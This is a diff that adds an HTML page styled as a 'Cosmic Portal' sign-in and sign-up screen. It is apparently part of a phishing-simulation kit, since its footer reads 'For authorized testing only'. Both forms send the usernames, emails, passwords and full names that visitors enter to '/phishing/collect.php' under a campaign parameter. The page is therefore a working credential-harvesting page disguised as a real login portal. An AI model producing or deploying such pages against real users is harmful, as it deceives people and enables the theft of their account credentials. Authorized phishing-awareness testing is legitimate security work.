@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Portal – Sign In</title>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <style>
+        /* COSMIC PRISMATIC THEME */
+        :root {
+            --cosmic-bg: #0a0a0f;
+            --cosmic-glass: rgba(10, 20, 40, 0.6);
+            --cosmic-neon-blue: #00f3ff;
+            --cosmic-neon-green: #00ff9d;
+            --cosmic-neon-purple: #b300ff;
+            --cosmic-neon-pink: #ff00c8;
+            --cosmic-neon-cyan: #0ff0fc;
+            --cosmic-glow: 0 0 20px rgba(0, 243, 255, 0.5);
+            --cosmic-border: 1px solid rgba(0, 243, 255, 0.3);
+        }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            background: radial-gradient(ellipse at bottom, #0a0a1a 0%, #030307 100%);
+            font-family: 'Share Tech Mono', monospace;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+        body::before {
+            content: '';
+            position: fixed;
+            top:0; left:0; width:100%; height:100%;
+            background: url('data:image/svg+xml;utf8,<svg width="100%" height="100%" xmlns="http://www.w3.org/2000/svg"><defs><radialGradient id="g" cx="50%" cy="50%" r="50%"><stop offset="0%" stop-color="%2300f3ff" stop-opacity="0.1"/><stop offset="100%" stop-color="%2300f3ff" stop-opacity="0"/></radialGradient></defs><rect width="100%" height="100%" fill="black"/><circle cx="20%" cy="30%" r="150" fill="url(%23g)"/><circle cx="80%" cy="70%" r="200" fill="url(%23g)"/></svg>');
+            opacity:0.4; pointer-events:none; z-index:0;
+        }
+        .container { width:100%; max-width:400px; margin:20px; position:relative; z-index:1; }
+        .glass-panel {
+            background: var(--cosmic-glass);
+            backdrop-filter: blur(12px);
+            border: var(--cosmic-border);
+            border-radius: 24px;
+            padding: 40px 30px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.6), var(--cosmic-glow);
+        }
+        h1 { color: var(--cosmic-neon-blue); text-align:center; margin-bottom:30px; letter-spacing:4px; border-bottom:2px solid var(--cosmic-neon-purple); padding-bottom:15px; }
+        .tabs { display:flex; gap:10px; margin-bottom:25px; }
+        .tab { flex:1; text-align:center; padding:10px; background:rgba(0,0,0,0.3); border:1px solid var(--cosmic-neon-cyan); border-radius:30px; color:var(--cosmic-neon-cyan); cursor:pointer; }
+        .tab.active { background:var(--cosmic-neon-cyan); color:#000; border-color:var(--cosmic-neon-green); }
+        .form-group { margin-bottom:20px; }
+        label { display:block; color:var(--cosmic-neon-cyan); margin-bottom:5px; }
+        input { width:100%; padding:12px 16px; background:rgba(0,0,0,0.5); border:1px solid var(--cosmic-neon-blue); border-radius:30px; color:#fff; font-family:inherit; }
+        input:focus { outline:none; border-color:var(--cosmic-neon-green); box-shadow:0 0 15px var(--cosmic-neon-green); }
+        .btn { width:100%; padding:14px; background:transparent; color:var(--cosmic-neon-blue); border:2px solid var(--cosmic-neon-blue); border-radius:40px; font-size:1.2em; cursor:pointer; margin-top:10px; }
+        .btn:hover { background:var(--cosmic-neon-blue); color:#000; box-shadow:0 0 30px var(--cosmic-neon-blue); }
+        .footer { text-align:center; margin-top:30px; color:#888; font-size:0.8em; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="glass-panel">
+            <h1>🌀 COSMIC PORTAL</h1>
+            <div class="tabs">
+                <div class="tab active" onclick="showTab('signin')">SIGN IN</div>
+                <div class="tab" onclick="showTab('signup')">CREATE ACCOUNT</div>
+            </div>
+            <!-- Sign In Form -->
+            <div id="signin">
+                <form action="/phishing/collect.php?campaign=1" method="post">
+                    <input type="hidden" name="page" value="index_signin">
+                    <div class="form-group">
+                        <label>Username / Email</label>
+                        <input type="text" name="username" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Password</label>
+                        <input type="password" name="password" required>
+                    </div>
+                    <button type="submit" class="btn">SIGN IN</button>
+                </form>
+            </div>
+            <!-- Sign Up Form (initially hidden) -->
+            <div id="signup" style="display:none;">
+                <form action="/phishing/collect.php?campaign=1" method="post">
+                    <input type="hidden" name="page" value="index_signup">
+                    <div class="form-group">
+                        <label>Full Name</label>
+                        <input type="text" name="fullname" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Email</label>
+                        <input type="email" name="email" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Password</label>
+                        <input type="password" name="password" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Confirm Password</label>
+                        <input type="password" name="confirm_password" required>
+                    </div>
+                    <button type="submit" class="btn">CREATE ACCOUNT</button>
+                </form>
+            </div>
+            <div class="footer">⚡ For authorized testing only.</div>
+        </div>
+    </div>
+    <script>
+        function showTab(tab) {
+            document.getElementById('signin').style.display = tab === 'signin' ? 'block' : 'none';
+            document.getElementById('signup').style.display = tab === 'signup' ? 'block' : 'none';
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            event.target.classList.add('active');
+        }
+    </script>
+</body>
+</html>
